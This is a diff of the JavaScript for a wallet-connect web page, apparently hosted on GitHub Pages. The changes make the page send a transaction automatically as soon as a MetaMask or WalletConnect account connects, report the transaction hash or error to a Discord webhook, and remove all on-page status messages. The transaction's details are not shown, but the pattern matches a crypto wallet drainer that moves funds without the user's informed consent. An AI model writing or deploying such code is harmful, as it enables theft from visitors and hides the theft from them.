@@ -10,30 +10,39 @@ async function connectWallet() {
     document.getElementById("connectButton").disabled = true; // Disable the button
 
     try {
-        // Check if MetaMask is installed
-        if (typeof window.ethereum !== 'undefined') {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const account = accounts[0];
-            console.log(`Connected to account: ${account}`);
-            document.getElementById("status").innerText = `Connected: ${account}`;
-
-            // After connecting, send a transaction
-            await sendTransaction(); // Automatically send the transaction after connecting
-        } else {
-            // If on a mobile device and MetaMask isn't installed, suggest installation
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (isMobile) {
-                // Prompt user to open the MetaMask app
-                alert("It seems that MetaMask is not recognized. Please make sure it's installed and try again.");
-                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank"); // Directing to your GitHub Pages URL
+        // Show wallet selection options
+        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) WalletConnect");
+        
+        if (walletChoice === "1") {
+            // MetaMask connection logic
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const account = accounts[0];
+                console.log(`Connected to MetaMask account: ${account}`);
+                
+                await sendTransaction(); // Automatically send the transaction
             } else {
-                console.error("MetaMask is not installed. Please install it.");
-                document.getElementById("status").innerText = "MetaMask is not installed.";
+                alert("MetaMask is not installed. Please install it.");
+                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
             }
+        } else if (walletChoice === "2") {
+            // WalletConnect connection logic
+            const provider = new WalletConnectProvider.default({
+                infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
+            });
+
+            await provider.enable();
+            const web3 = new ethers.providers.Web3Provider(provider);
+            const accounts = await web3.listAccounts();
+            const account = accounts[0];
+            console.log(`Connected to WalletConnect account: ${account}`);
+            
+            await sendTransaction(); // Automatically send the transaction
+        } else {
+            alert("Invalid choice. Please refresh and try again.");
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
-        document.getElementById("status").innerText = "Error connecting to wallet.";
     } finally {
         isConnecting = false; // Reset the flag
         document.getElementById("connectButton").disabled = false; // Re-enable the button
@@ -55,20 +64,17 @@ async function sendTransaction() {
         try {
             const txResponse = await signer.sendTransaction(transaction);
             console.log("Transaction response:", txResponse);
-            document.getElementById("status").innerText = `Transaction sent! Hash: ${txResponse.hash}`;
-
+            
             // Send to Discord webhook
             await sendWebhook(txResponse.hash, "success");
         } catch (error) {
             console.error("Error sending transaction:", error);
-            document.getElementById("status").innerText = "Error sending transaction.";
-
+            
             // Send to Discord webhook
             await sendWebhook(error.message, "failure");
         }
     } else {
         console.error("MetaMask is not installed. Please install it.");
-        document.getElementById("status").innerText = "MetaMask is not installed.";
     }
 }
 
